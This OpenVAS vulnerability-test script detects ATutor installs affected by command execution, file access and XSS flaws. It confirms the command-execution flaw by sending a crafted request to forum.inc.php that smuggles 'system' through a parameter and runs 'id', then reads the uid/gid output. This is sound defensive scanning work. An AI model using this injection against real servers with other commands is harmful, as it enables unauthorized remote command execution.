###############################################################################
# OpenVAS Vulnerability Test
# $Id: atutor_multiple_flaws.nasl 6046 2017-04-28 09:02:54Z teissa $
#
# ATutor < 1.5.1-pl1 Multiple Flaws
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Ref: Andreas Sandblad, Secunia Research

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20095");
  script_version("$Revision: 6046 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-28 11:02:54 +0200 (Fri, 28 Apr 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3403", "CVE-2005-3404", "CVE-2005-3405");
  script_bugtraq_id(15221);
  script_xref(name:"OSVDB", value:"20344");
  script_xref(name:"OSVDB", value:"20345");
  script_xref(name:"OSVDB", value:"20346");
  script_xref(name:"OSVDB", value:"20347");
  script_xref(name:"OSVDB", value:"20348");
  script_xref(name:"OSVDB", value:"20349");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("ATutor < 1.5.1-pl1 Multiple Flaws");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2005-55/advisory/");

  tag_summary = "The remote web server contains a PHP application that is prone to
  multiple flaws.

  Description :

  The remote host is running ATutor, an open-source web-based Learning
  Content Management System (LCMS) written in PHP.

  The version of ATutor installed on the remote host may be vulnerable
  to arbitrary command execution, arbitrary file access, and cross-site
  scripting attacks.  Successful exploitation of the first two issues
  requires that PHP's 'register_globals' setting be enabled and, in some
  cases, that 'magic_quotes_gpc' be disabled.";

  tag_solution = "Apply patch 1.5.1-pl1 or upgrade to version 1.5.2 or later.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/login.php";

  res = http_get_cache( item:url, port:port );

  if( egrep( pattern:"<meta name=.Generator. content=.ATutor - Copyright", string:res ) ) {

    url = "/include/html/forum.inc.php?addslashes=system&asc=id";

    req = http_get( item:url, port:port );
    res = http_keepalive_send_recv( port:port, data:req );

    # Isolate command output.
    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep( string:res, pattern:pat );
    if( matches ) {
      foreach match( split( matches ) ) {
        match = chomp( match );
        output = eregmatch( pattern:pat, string:match );
        if( ! isnull( output ) ) {
          output = output[1];
          break;
        }
      }
    }

    # If that didn't work, perhaps just the system function is disabled.
    if( isnull( output ) ) {
      matches = egrep( pattern:"system\(\) has been disabled for security reasons", string:res );
      if( matches ) {
        output = "";
        foreach match( split( matches ) ) {
          output += match;
        }
      }
    }

    if( output ) {
      security_message( port:port, data:output );
      exit( 0 );
    }
  }
}

exit( 99 );
